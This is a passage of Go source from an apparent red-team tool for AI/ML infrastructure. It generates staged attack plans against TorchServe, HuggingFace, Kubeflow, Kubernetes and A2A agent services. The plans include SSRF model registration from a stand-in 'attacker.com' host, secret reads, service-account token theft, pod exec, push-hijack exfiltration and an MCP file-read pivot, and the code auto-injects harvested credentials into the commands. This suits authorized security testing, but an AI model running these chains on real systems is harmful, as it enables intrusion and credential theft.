			Rationale:   "TorchServe should progress through model enumeration on management API before testing SSRF registration or handler execution.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" enum"), "Enumerate models and management API health.", false, 10),
				newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" models --model <model>"), "Get detailed model info including handler and workers.", false, 20),
				newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" metrics"), "Check for exposed inference metrics.", false, 30),
				newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" predict --model <model> --payload '{}' --force-exploit"), "Only after a model is confirmed.", true, 40),
				newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" register --model-url http://attacker.com/test.mar --force-exploit"), "ShellTorch SSRF test — only with engagement approval.", true, 50),
				newWorkflowRecommendation(formatCommandExample("torchserve --target "+target+" register --model-url http://attacker.com/aipostex.mar --model aipostex-handler --payload '{\"data\":\"test\"}' --force-exploit"), "Register a named archive and invoke it to verify the handler path executed.", true, 60),
			},
		}
	case "hf-tgi", "hf-tei":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "HuggingFace inference server detected; progress through service-type detection, model/metrics enumeration, and inference access testing.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("huggingface --target "+target+" enum"), "Identify TGI vs TEI service type and served model.", false, 10),
				newWorkflowRecommendation(formatCommandExample("huggingface --target "+target+" models"), "List all TGI models via /v1/models.", false, 20),
				newWorkflowRecommendation(formatCommandExample("huggingface --target "+target+" metrics"), "Scrape Prometheus metrics for model and performance data.", false, 25),
				hfModelDownloadRecommendation(target, "", 28),
				newWorkflowRecommendation(formatCommandExample("huggingface --target "+target+" generate --prompt \"Hello\" --force-exploit"), "Test text generation access; against a gated TGI-compatible gateway, supply the harvested token to replay credentials for real backend inference.", true, 30),
				newWorkflowRecommendation(formatCommandExample("huggingface --target "+target+" embed --inputs \"test\" --force-exploit"), "Test unauthenticated embedding access (TEI).", true, 40),
			},
		}
	case "kubeflow":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "Kubeflow Pipelines API exposed; enumerate pipelines, run history, and experiments before attempting pipeline run injection.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("kubeflow --target "+target+" enum"), "Enumerate API reachability and version.", false, 10),
				newWorkflowRecommendation(formatCommandExample("kubeflow --target "+target+" pipelines"), "List accessible ML pipelines and parameters.", false, 20),
				newWorkflowRecommendation(formatCommandExample("kubeflow --target "+target+" runs"), "List existing pipeline runs and status.", false, 30),
				newWorkflowRecommendation(formatCommandExample("kubeflow --target "+target+" experiments"), "List experiments.", false, 35),
				newWorkflowRecommendation(formatCommandExample("kubeflow --target "+target+" run-pipeline --pipeline-id <pipeline-id> --run-name injected --force-exploit"), "Inject a pipeline run — only with engagement approval.", true, 50),
			},
		}
	case "kube-apiserver":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "kube-apiserver exposed; map anonymous reach and the current identity's authorization before reading secrets, stealing SA tokens, or in-pod execution.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure rbac-probe"), "Check whether the API server answers anonymously (anon-open vs 401).", false, 10),
				newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure enum --all-namespaces"), "Enumerate workloads, secrets, and namespaces the caller can see.", false, 20),
				newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure access-review"), "Map the current identity's real authorization (SelfSubjectRulesReview).", false, 30),
				newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure secret-read --all-namespaces --force-exploit"), "Read Secret objects across namespaces (e.g. model-registry credentials).", true, 40),
				newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure sa-loot --namespace <namespace> --force-exploit"), "Exec-steal a pod's service-account token and measure the privilege delta.", true, 50),
				newWorkflowRecommendation(formatCommandExample("k8s --target "+target+" --insecure pod-exec --namespace <namespace> --command id --force-exploit"), "Only after enum confirms a running pod and execution is in scope.", true, 60),
			},
		}
	case "a2a":
		return workflowPlan{
			Target:      target,
			Stage:       "discovery",
			Landed:      "reachable",
			ChainSource: "discover network",
			Rationale:   "A2A agent surface exposed; progress through agent card + skill enum into bounded task probes, then streaming / push-notification / MCP-pivot checks if approved.",
			Recommendations: []workflowRecommendation{
				newWorkflowRecommendation(formatCommandExample("a2a --target "+target+" enum"), "Pull agent card metadata (name, version, skill count).", false, 10),
				newWorkflowRecommendation(formatCommandExample("a2a --target "+target+" skills"), "Enumerate skills with input/output modes.", false, 20),
				newWorkflowRecommendation(formatCommandExample("scan targets --target "+target+" --tags a2a,agent"), "Run the bundled A2A templates for detect+exploit coverage.", false, 15),
				newWorkflowRecommendation(formatCommandExample("a2a --target "+target+" task-send --message 'ping' --force-exploit"), "Test unauthenticated task submission.", true, 30),
				newWorkflowRecommendation(formatCommandExample("a2a --target "+target+" stream-probe --message 'list tools' --force-exploit"), "Subscribe to SSE stream — may leak agent internals.", true, 40),
				newWorkflowRecommendation(formatCommandExample("a2a --target "+target+" push-hijack --task-id <task-id> --force-exploit"), "Register canary webhook to confirm the data-exfil path.", true, 50),
				newWorkflowRecommendation(formatCommandExample("a2a --target "+target+" mcp-pivot --preset file-read --force-exploit"), "Cross-protocol pivot to MCP file-read tool.", true, 60),
			},
		}
	default:
		return workflowPlan{
			Target:    target,
			Stage:     "discovery",
			Rationale: "Template coverage may exist, but deeper follow-on workflows for this fingerprint are deferred.",
		}
	}
}

func buildMCPInspectorPivotWorkflowPlan(inspectorTarget, serverURL, serverName, transportType string) workflowPlan {
	serverURL = canonicalServiceURL(serverURL)
	label := strings.TrimSpace(serverName)
	if label == "" {
		label = "disclosed MCP server"
	}
	transportType = strings.TrimSpace(transportType)
	if transportType == "" {
		transportType = "unknown"
	}
	return workflowPlan{
		Target:      serverURL,
		Stage:       "discovery",
		Landed:      "confirmed",
		ChainSource: "mcp-inspector",
		Rationale: fmt.Sprintf(
			"Inspector API at %s disclosed %s (%s transport); enumerate the backing MCP server next.",
			canonicalServiceURL(inspectorTarget),
			label,
			transportType,
		),
		Recommendations: []workflowRecommendation{
			newWorkflowRecommendation(formatCommandExample("mcp --target "+serverURL+" enum"), "Enumerate the backing MCP server disclosed by the inspector API.", false, 10),
		},
	}
}

func enrichWorkflowPlansWithCredentials(plans []workflowPlan, store *credchain.Store) []workflowPlan {
	if store == nil || store.TotalCredentials() == 0 {
		return plans
	}
	enriched := make([]workflowPlan, len(plans))
	for i, plan := range plans {
		enriched[i] = enrichWorkflowPlanWithCredentials(plan, store)
	}
	return enriched
}

func workflowPlansFromCredentialStore(store *credchain.Store) []workflowPlan {
	if store == nil || store.TotalCredentials() == 0 {
		return nil
	}
	actions := credchain.GenerateChainActions(store)
	if len(actions) == 0 {
		return nil
	}
	plansByTarget := make(map[string]*workflowPlan)
	order := make([]string, 0)
	for _, action := range actions {
		target := canonicalServiceURL(action.TargetURL)
		if strings.TrimSpace(target) == "" || strings.Contains(target, "<") {
			continue
		}
		plan := plansByTarget[target]
		if plan == nil {
			order = append(order, target)
			rationale := "Discovered credential or service URL can be tested against this concrete follow-on target."
			if workflowTargetNeedsReachabilityCheck(target) {
				rationale = "[Unverified service URL from exposed config] Target is concrete, but DNS/routing may only work from the workload network."
			}
			plansByTarget[target] = &workflowPlan{
				Target:      target,
				Stage:       "credential-pivot",
				Landed:      "read-confirmed",
				ChainSource: "credential-chain",
				Rationale:   rationale,
			}
			plan = plansByTarget[target]
		}
		plan.Recommendations = append(plan.Recommendations,
			newWorkflowRecommendation(formatCommandExample(action.Command), action.Description, false, 15+len(plan.Recommendations)),
		)
	}
	plans := make([]workflowPlan, 0, len(order))
	for _, target := range order {
		plans = append(plans, *plansByTarget[target])
	}
	return plans
}

func workflowTargetNeedsReachabilityCheck(target string) bool {
	u, err := url.Parse(canonicalServiceURL(target))
	if err != nil {
		return false
	}
	host := strings.ToLower(strings.TrimSpace(u.Hostname()))
	if host == "" || host == "localhost" || host == "127.0.0.1" || host == "::1" {
		return false
	}
	if net.ParseIP(host) != nil {
		return false
	}
	return strings.Contains(host, ".")
}

func enrichWorkflowPlanWithCredentials(plan workflowPlan, store *credchain.Store) workflowPlan {
	if store == nil {
		return plan
	}
	hostPort := compactTargetLabel(plan.Target)
	creds := store.ForTarget(hostPort)
	if len(creds) == 0 {
		return plan
	}

	credMap := make(map[string]credchain.Credential)
	for _, c := range creds {
		// Safety net: never inject an empty or metadata-key-shaped value (e.g. a
		// mis-extracted "acceptance_class") into a suggested command.
		if strings.TrimSpace(c.Value) == "" || credchain.LooksLikeMetadataKey(c.Value) {
			continue
		}
		if _, exists := credMap[c.Type]; !exists {
			credMap[c.Type] = c
		}
	}

	newRecs := make([]workflowRecommendation, 0, len(plan.Recommendations))
	for _, rec := range plan.Recommendations {
		rec = injectCredentialIntoRecommendation(rec, credMap, plan.Target)
		newRecs = append(newRecs, rec)
	}
	plan.Recommendations = newRecs
	return plan
}

func injectCredentialIntoRecommendation(rec workflowRecommendation, creds map[string]credchain.Credential, target string) workflowRecommendation {
	cmd := rec.Command

	if c, ok := creds["jupyter-token"]; ok && strings.Contains(cmd, "jupyter") {
		if !strings.Contains(cmd, "--token") {
			cmd = strings.Replace(cmd, " enum", " --token "+c.Value+" enum", 1)
			cmd = strings.Replace(cmd, " notebooks", " --token "+c.Value+" notebooks", 1)
			cmd = strings.Replace(cmd, " kernels", " --token "+c.Value+" kernels", 1)
			cmd = strings.Replace(cmd, " read-notebook", " --token "+c.Value+" read-notebook", 1)
			cmd = strings.Replace(cmd, " exec", " --token "+c.Value+" exec", 1)
			rec.Rationale += fmt.Sprintf(" (using discovered token from %s)", c.Source)
		}
	}

	if c, ok := creds["openai-api-key"]; ok && strings.Contains(cmd, "openai-compat") {
		if !strings.Contains(cmd, "--api-key") {
			cmd = insertFlagBeforeSubcommand(cmd, "--api-key "+c.Value)
			rec.Rationale += fmt.Sprintf(" (using discovered API key from %s)", c.Source)
		}
	}

	if strings.Contains(cmd, "vectordb") {
		if c, ok := creds["api-key"]; ok && !strings.Contains(cmd, "--api-key") {
			cmd = insertFlagBeforeSubcommand(cmd, "--api-key "+c.Value)
			rec.Rationale += fmt.Sprintf(" (using discovered API key from %s)", c.Source)
		}
	}

	if c, ok := creds["hf-token"]; ok {
		if strings.Contains(cmd, "huggingface") && strings.Contains(cmd, " model-download") {
			if !strings.Contains(cmd, "--hub-header") && workflowHFHubTokenAllowed(cmd, target) {
				cmd += fmt.Sprintf(` --hub-header "Authorization: Bearer %s"`, c.Value)
				rec.Rationale += fmt.Sprintf(" (using discovered HF token from %s for Hub access)", c.Source)
			}
		} else if !strings.Contains(cmd, "--header") && (strings.Contains(cmd, "openai-compat") || strings.Contains(cmd, "huggingface")) {
			cmd = insertFlagBeforeSubcommand(cmd, fmt.Sprintf(`--header "Authorization: Bearer %s"`, c.Value))
			rec.Rationale += fmt.Sprintf(" (using discovered HF token from %s)", c.Source)
		}
	}

	if c, ok := creds["bearer-token"]; ok && !strings.Contains(cmd, "--header") && !strings.Contains(cmd, "--api-key") {
		if strings.Contains(cmd, "openai-compat") {
			cmd = insertFlagBeforeSubcommand(cmd, fmt.Sprintf(`--header "Authorization: Bearer %s"`, c.Value))
			rec.Rationale += fmt.Sprintf(" (using discovered bearer token from %s)", c.Source)
		}
	}

	if c, ok := creds["mlflow-basic-auth"]; ok && strings.Contains(cmd, "mlflow") && !strings.Contains(cmd, "--header") {
		cmd = insertFlagBeforeSubcommand(cmd, fmt.Sprintf(`--header "Authorization: Basic %s"`, c.Value))
		rec.Rationale += fmt.Sprintf(" (using discovered MLflow Basic auth from %s)", c.Source)
	}

	if c, ok := creds["mlflow-run-id"]; ok && strings.Contains(cmd, "mlflow") && mlflowCommandAcceptsRunID(cmd) {
		if !strings.Contains(cmd, "--run-id") {
			cmd = insertFlagBeforeSubcommand(cmd, "--run-id "+c.Value)
			rec.Rationale += fmt.Sprintf(" (using discovered run ID from %s)", c.Source)
		}
	}

	rec.Command = cmd
	return rec
}

func mlflowCommandAcceptsRunID(cmd string) bool {
	return strings.Contains(cmd, " artifacts") || strings.Contains(cmd, " download-artifact") || strings.Contains(cmd, " bulk-download")
}

func insertFlagBeforeSubcommand(cmd, flag string) string {
	subcommands := []string{
		" enum", " extract", " search-sensitive", " auth-sweep",
		" validate-inference", " prompt-extract", " throughput",
		" proxy-test", " generate", " litellm-probe", " tool-enum", " prompt-test",
	}
	for _, sub := range subcommands {
		if idx := strings.Index(cmd, sub); idx > 0 {
			return cmd[:idx] + " " + flag + cmd[idx:]
		}
	}
	return cmd + " " + flag
}

func workflowHFHubTokenAllowed(cmd, target string) bool {
	hubBase := workflowCommandFlagValue(cmd, "--hub-base")
	if hubBase == "" {
		return true
	}
	target = workflowCommandTarget(cmd, target)
	return workflowSameHost(hubBase, target)
}

func workflowCommandTarget(cmd, fallback string) string {
	if target := workflowCommandFlagValue(cmd, "--target"); target != "" {
		return target
	}
	return fallback
}

func workflowCommandFlagValue(cmd, flag string) string {
	fields := strings.Fields(cmd)
	for i, part := range fields {
		if part == flag && i+1 < len(fields) {
			return strings.Trim(fields[i+1], `"'`)
		}
		if strings.HasPrefix(part, flag+"=") {
			return strings.Trim(strings.TrimPrefix(part, flag+"="), `"'`)
		}
	}
	return ""
}

func workflowSameHost(left, right string) bool {
	leftHost, ok := workflowURLHost(left)
	if !ok {
		return false
	}
	rightHost, ok := workflowURLHost(right)
	if !ok {
		return false
	}
	return leftHost == rightHost
}

func workflowURLHost(raw string) (string, bool) {
	u, err := url.Parse(canonicalServiceURL(raw))
	if err != nil || u.Hostname() == "" {
		return "", false
	}
	return strings.ToLower(u.Hostname()), true
}

func uniqueStringsOrdered(values []string) []string {
	seen := make(map[string]struct{}, len(values))
	out := make([]string, 0, len(values))
	for _, v := range values {
		if _, dup := seen[v]; !dup {
			seen[v] = struct{}{}
			out = append(out, v)
		}
	}
	return out
}

func firstOrPlaceholder(values []string, placeholder string) string {
	if value := firstNonPlaceholder(values); value != "" {
		return value
	}
	return placeholder
}

func firstNonPlaceholder(values []string) string {
	for _, value := range values {
		value = strings.TrimSpace(value)
		if value != "" {
			return value
		}
	}
	return ""
}
